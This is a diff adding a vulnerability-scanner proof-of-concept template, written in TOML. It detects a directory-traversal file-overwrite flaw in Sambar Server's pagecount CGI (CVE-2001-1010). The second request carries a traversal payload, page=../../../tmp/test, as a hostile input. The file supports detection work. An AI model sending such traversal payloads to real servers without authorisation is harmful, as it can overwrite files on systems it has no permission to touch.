@@ -1,0 +1,40 @@
+[info]
+author = "AVE"
+description = "检测 Sambar Server 的 /session/pagecount CGI 脚本是否存在目录遍历漏洞，通过 page 参数传入 ../ 路径可覆盖任意文件"
+id = "POC-AVE-2001-0438"
+name = "Sambar Server 4.4/5.0 pagecount 文件覆盖漏洞 PoC"
+severity = "medium"
+tags = [
+    "cve-2001-1010",
+    "sambar",
+    "pagecount",
+    "directory-traversal",
+]
+vuln_id = [
+    "CVE-2001-1010",
+    "AVE-2001-0438",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/session/pagecount"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["pagecount"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/session/pagecount?page=../../../tmp/test"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
